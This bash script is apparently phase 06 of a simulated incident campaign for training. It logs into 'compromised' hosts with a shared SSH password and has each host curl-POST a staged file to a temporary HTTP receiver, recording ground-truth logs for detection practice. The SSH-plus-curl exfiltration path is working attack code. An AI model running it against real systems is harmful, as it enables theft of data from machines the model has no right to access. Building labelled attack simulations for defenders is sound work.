#!/usr/bin/env bash

set -u

# ============================================================
# Nordic Manufacturing A/S
# H3 Incident Campaign V2
#
# Phase 06 - Exfiltration Simulation
#
# Input:
#   state/staged-data.json
#
# Traffic:
#
#   Compromised Host
#          |
#          | HTTP POST
#          v
#   IncidentVM:9090
#
# Only synthetic training data created by Phase 05
# is transferred.
# ============================================================


# ============================================================
# PATHS / CONFIG
# ============================================================

BASE_DIR="/opt/nordic-attack"
CONFIG_FILE="$BASE_DIR/config/defaults.conf"

if [[ ! -f "$CONFIG_FILE" ]]; then
    echo "[ERROR] Configuration file not found: $CONFIG_FILE"
    exit 1
fi

# shellcheck source=/dev/null
source "$CONFIG_FILE"

mkdir -p \
    "$NORDIC_LOG_DIR" \
    "$NORDIC_STATE_DIR" \
    "$NORDIC_UPLOAD_DIR"


# ============================================================
# CAMPAIGN CONFIGURATION
# ============================================================

INCIDENT_ID="${NORDIC_INCIDENT_ID:-H3-$(date +%Y%m%d-%H%M%S)}"

SSH_PASSWORD="${NORDIC_SSH_PASSWORD:-$NORDIC_DEFAULT_SSH_PASSWORD}"

STAGING_STATE="$NORDIC_STATE_DIR/staged-data.json"

EXFIL_STATE="$NORDIC_STATE_DIR/exfiltration.json"

LOG_FILE="$NORDIC_LOG_DIR/${INCIDENT_ID}-06-exfil.log"

EXFIL_PORT="${NORDIC_EXFIL_PORT:-9090}"


# ============================================================
# FUNCTIONS
# ============================================================

log() {

    local MESSAGE="$1"

    echo "$MESSAGE"

    printf '%s %s\n' \
        "$(date --iso-8601=seconds)" \
        "$MESSAGE" \
        >> "$LOG_FILE"
}


ground_truth() {

    local MESSAGE="$1"

    printf '%s INCIDENT=%s PHASE=06 %s\n' \
        "$(date --iso-8601=seconds)" \
        "$INCIDENT_ID" \
        "$MESSAGE" \
        >> "$NORDIC_GROUND_TRUTH_LOG"
}


# ============================================================
# REQUIRED COMMANDS
# ============================================================

for CMD in python3 sshpass ssh; do

    if ! command -v "$CMD" >/dev/null 2>&1; then
        echo "[ERROR] Required command not found: $CMD"
        exit 1
    fi

done


# ============================================================
# VALIDATION
# ============================================================

if [[ ! -f "$STAGING_STATE" ]]; then

    echo "[ERROR] Missing staging inventory:"
    echo "$STAGING_STATE"
    echo
    echo "Run Phase 05 first."

    exit 1
fi


if [[ -z "$SSH_PASSWORD" ]]; then

    echo "[ERROR] Campaign SSH password is missing."
    exit 1
fi


if ! [[ "$EXFIL_PORT" =~ ^[0-9]+$ ]] ||
   (( EXFIL_PORT < 1024 || EXFIL_PORT > 65535 )); then

    echo "[ERROR] Invalid exfiltration port:"
    echo "$EXFIL_PORT"

    exit 1
fi


# ============================================================
# DETERMINE INCIDENTVM IP
# ============================================================
#
# GUI can explicitly supply:
#
#   NORDIC_INCIDENT_IP
#
# Otherwise determine the source address used toward the
# first compromised host.
# ============================================================

FIRST_TARGET="$(
    python3 - "$STAGING_STATE" <<'PY'
import json
import sys

with open(sys.argv[1], encoding="utf-8") as f:
    data = json.load(f)

hosts = data.get("hosts", [])

if hosts:
    print(hosts[0].get("ip", ""))
PY
)"


INCIDENT_IP="${NORDIC_INCIDENT_IP:-}"


if [[ -z "$INCIDENT_IP" ]] && [[ -n "$FIRST_TARGET" ]]; then

    INCIDENT_IP="$(
        ip -4 route get "$FIRST_TARGET" 2>/dev/null |
        awk '
        {
            for (i=1; i<=NF; i++) {
                if ($i == "src") {
                    print $(i+1)
                    exit
                }
            }
        }'
    )"

fi


if [[ -z "$INCIDENT_IP" ]]; then

    echo "[ERROR] Unable to determine IncidentVM IP."
    echo
    echo "Supply NORDIC_INCIDENT_IP through the campaign GUI."

    exit 1
fi


# ============================================================
# LOAD STAGED HOSTS
#
# Format:
#
# IP|PORT|USER|FILE|SIZE|HASH
# ============================================================

mapfile -t STAGED_HOSTS < <(
    python3 - "$STAGING_STATE" <<'PY'
import json
import sys

with open(sys.argv[1], encoding="utf-8") as f:
    data = json.load(f)

for host in data.get("hosts", []):

    if not host.get("staged"):
        continue

    print(
        "{}|{}|{}|{}|{}|{}".format(
            host.get("ip", ""),
            host.get("ssh_port", 22),
            host.get("ssh_user", "ubuntu"),
            host.get("file", ""),
            host.get("size", 0),
            host.get("sha256", ""),
        )
    )
PY
)


# ============================================================
# BANNER
# ============================================================

echo
echo "============================================================"
echo " NORDIC MANUFACTURING"
echo " H3 INCIDENT CAMPAIGN V2"
echo " PHASE 06 - EXFILTRATION"
echo "============================================================"
echo

log "[*] Incident ID: $INCIDENT_ID"
log "[*] IncidentVM receiver: $INCIDENT_IP:$EXFIL_PORT"
log "[*] Staged hosts: ${#STAGED_HOSTS[@]}"

echo


# ============================================================
# NO STAGED HOSTS
# ============================================================

if [[ ${#STAGED_HOSTS[@]} -eq 0 ]]; then

    log "[*] No staged hosts available."

    python3 - "$EXFIL_STATE" "$INCIDENT_ID" <<'PY'
import json
import sys
from datetime import datetime, timezone

data = {
    "incident_id": sys.argv[2],
    "generated": datetime.now(timezone.utc).isoformat(),
    "count": 0,
    "transfers": [],
}

with open(sys.argv[1], "w", encoding="utf-8") as f:
    json.dump(data, f, indent=2)
PY

    ground_truth "PHASE_COMPLETE transfers=0"

    exit 0
fi


# ============================================================
# CREATE TEMPORARY RECEIVER
# ============================================================

RECEIVER="$NORDIC_STATE_DIR/.exfil-receiver.py"

cat > "$RECEIVER" <<'PY'
import os
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

bind_ip = sys.argv[1]
port = int(sys.argv[2])
upload_dir = sys.argv[3]

os.makedirs(upload_dir, exist_ok=True)


class Handler(BaseHTTPRequestHandler):

    def do_POST(self):

        length = int(
            self.headers.get(
                "Content-Length",
                "0"
            )
        )

        source = self.headers.get(
            "X-Nordic-Source",
            "unknown"
        )

        incident = self.headers.get(
            "X-Nordic-Incident",
            "unknown"
        )

        safe_source = "".join(
            c if c.isalnum() or c in ".-_" else "_"
            for c in source
        )

        safe_incident = "".join(
            c if c.isalnum() or c in ".-_" else "_"
            for c in incident
        )

        filename = (
            f"{safe_incident}-{safe_source}.bin"
        )

        destination = os.path.join(
            upload_dir,
            filename
        )

        remaining = length

        with open(destination, "wb") as f:

            while remaining > 0:

                chunk = self.rfile.read(
                    min(65536, remaining)
                )

                if not chunk:
                    break

                f.write(chunk)

                remaining -= len(chunk)

        received = length - remaining

        self.send_response(200)
        self.end_headers()

        self.wfile.write(
            f"NORDIC_RECEIVED {received}\n".encode()
        )

    def log_message(self, fmt, *args):

        sys.stdout.write(
            "%s %s\n" %
            (
                self.address_string(),
                fmt % args
            )
        )

        sys.stdout.flush()


server = HTTPServer(
    (bind_ip, port),
    Handler
)

server.serve_forever()
PY


# ============================================================
# START RECEIVER
# ============================================================

RECEIVER_LOG="$NORDIC_LOG_DIR/${INCIDENT_ID}-exfil-receiver.log"

python3 "$RECEIVER" \
    "$INCIDENT_IP" \
    "$EXFIL_PORT" \
    "$NORDIC_UPLOAD_DIR" \
    >> "$RECEIVER_LOG" 2>&1 &

RECEIVER_PID=$!


cleanup() {

    if kill -0 "$RECEIVER_PID" 2>/dev/null; then
        kill "$RECEIVER_PID" 2>/dev/null || true
        wait "$RECEIVER_PID" 2>/dev/null || true
    fi

    rm -f "$RECEIVER"
}

trap cleanup EXIT


sleep 1


if ! kill -0 "$RECEIVER_PID" 2>/dev/null; then

    echo "[ERROR] Exfiltration receiver failed to start."
    echo
    echo "Receiver log:"
    echo "$RECEIVER_LOG"

    exit 1
fi


log "[+] Exfiltration receiver started."


# ============================================================
# EXFILTRATION
# ============================================================

TMP_RESULTS="$NORDIC_STATE_DIR/.exfil.tmp"

: > "$TMP_RESULTS"

SUCCESS_COUNT=0
FAILED_COUNT=0


for RECORD in "${STAGED_HOSTS[@]}"; do

    IFS='|' read -r \
        HOST \
        SSH_PORT \
        SSH_USER \
        REMOTE_FILE \
        EXPECTED_SIZE \
        EXPECTED_HASH \
        <<< "$RECORD"


    echo
    echo "------------------------------------------------------------"
    echo " Source host: $HOST"
    echo "------------------------------------------------------------"
    echo


    log "[*] Starting simulated exfiltration from $HOST"

    ground_truth \
        "EXFIL_START source=$HOST destination=$INCIDENT_IP:$EXFIL_PORT file=$REMOTE_FILE"


    # --------------------------------------------------------
    # Execute HTTP POST FROM compromised host.
    #
    # The remote host sends only the exact staging file
    # generated by Phase 05.
    # --------------------------------------------------------

    REMOTE_RESULT="$(
        sshpass -p "$SSH_PASSWORD" \
        ssh \
            -p "$SSH_PORT" \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -o ConnectTimeout="$NORDIC_SSH_TIMEOUT" \
            -o PreferredAuthentications=password \
            -o PubkeyAuthentication=no \
            -o NumberOfPasswordPrompts=1 \
            "$SSH_USER@$HOST" \
            bash -s -- \
                "$REMOTE_FILE" \
                "$INCIDENT_IP" \
                "$EXFIL_PORT" \
                "$HOST" \
                "$INCIDENT_ID" <<'REMOTE'
REMOTE_FILE="$1"
INCIDENT_IP="$2"
EXFIL_PORT="$3"
SOURCE_HOST="$4"
INCIDENT_ID="$5"

if [[ ! -f "$REMOTE_FILE" ]]; then
    echo "NORDIC_EXFIL_ERROR file-not-found"
    exit 1
fi

if ! command -v curl >/dev/null 2>&1; then
    echo "NORDIC_EXFIL_ERROR curl-not-found"
    exit 1
fi

RESPONSE="$(
    curl \
        -sS \
        --connect-timeout 5 \
        --max-time 30 \
        -X POST \
        -H "Content-Type: application/octet-stream" \
        -H "X-Nordic-Source: $SOURCE_HOST" \
        -H "X-Nordic-Incident: $INCIDENT_ID" \
        --data-binary "@$REMOTE_FILE" \
        "http://${INCIDENT_IP}:${EXFIL_PORT}/upload"
)"

RESULT=$?

if [[ $RESULT -ne 0 ]]; then
    echo "NORDIC_EXFIL_ERROR curl-failed"
    exit 1
fi

echo "$RESPONSE"
REMOTE
    )"

    SSH_RESULT=$?


    # --------------------------------------------------------
    # VERIFY TRANSFER
    # --------------------------------------------------------

    if [[ $SSH_RESULT -eq 0 ]] &&
       grep -q '^NORDIC_RECEIVED ' <<< "$REMOTE_RESULT"; then

        RECEIVED_SIZE="$(
            printf '%s\n' "$REMOTE_RESULT" |
            awk '/^NORDIC_RECEIVED / {print $2}' |
            tail -n 1
        )"


        SUCCESS_COUNT=$(( SUCCESS_COUNT + 1 ))


        log "[+] Exfiltration completed from $HOST"
        log "    Destination: $INCIDENT_IP:$EXFIL_PORT"
        log "    Bytes: $RECEIVED_SIZE"


        printf '%s|%s|%s|%s|%s|%s\n' \
            "$HOST" \
            "$REMOTE_FILE" \
            "$INCIDENT_IP" \
            "$EXFIL_PORT" \
            "$RECEIVED_SIZE" \
            "$EXPECTED_HASH" \
            >> "$TMP_RESULTS"


        ground_truth \
            "EXFIL_SUCCESS source=$HOST destination=$INCIDENT_IP:$EXFIL_PORT bytes=$RECEIVED_SIZE"

    else

        FAILED_COUNT=$(( FAILED_COUNT + 1 ))

        log "[WARNING] Exfiltration failed from $HOST"

        ground_truth \
            "EXFIL_FAILED source=$HOST destination=$INCIDENT_IP:$EXFIL_PORT"

    fi

done


# ============================================================
# CREATE exfiltration.json
# ============================================================

python3 - \
    "$TMP_RESULTS" \
    "$EXFIL_STATE" \
    "$INCIDENT_ID" <<'PY'

import json
import sys
from datetime import datetime, timezone

source_file = sys.argv[1]
output_file = sys.argv[2]
incident_id = sys.argv[3]

transfers = []

with open(source_file, encoding="utf-8") as f:

    for line in f:

        line = line.rstrip("\n")

        if not line:
            continue

        (
            source,
            remote_file,
            destination,
            port,
            size,
            sha256,
        ) = line.split("|", 5)

        transfers.append(
            {
                "source": source,
                "remote_file": remote_file,
                "destination": destination,
                "port": int(port),
                "bytes": int(size),
                "sha256": sha256,
                "successful": True,
            }
        )


data = {
    "incident_id": incident_id,
    "generated": datetime.now(timezone.utc).isoformat(),
    "count": len(transfers),
    "transfers": transfers,
}


with open(output_file, "w", encoding="utf-8") as f:
    json.dump(data, f, indent=2)

PY


rm -f "$TMP_RESULTS"


# ============================================================
# STOP RECEIVER
# ============================================================

cleanup

trap - EXIT


# ============================================================
# SUMMARY
# ============================================================

echo
echo "============================================================"
echo " PHASE 06 COMPLETED"
echo "============================================================"
echo

echo "IncidentVM receiver:"
echo "  http://$INCIDENT_IP:$EXFIL_PORT"

echo

echo "Staged hosts:"
echo "  ${#STAGED_HOSTS[@]}"

echo

echo "Successful transfers:"
echo "  $SUCCESS_COUNT"

echo

echo "Failed transfers:"
echo "  $FAILED_COUNT"

echo

echo "Received files:"
echo "  $NORDIC_UPLOAD_DIR"

echo

echo "Exfiltration state:"
echo "  $EXFIL_STATE"

echo

echo "Log:"
echo "  $LOG_FILE"

echo


ground_truth \
    "PHASE_COMPLETE transfers=$SUCCESS_COUNT failed=$FAILED_COUNT"


exit 0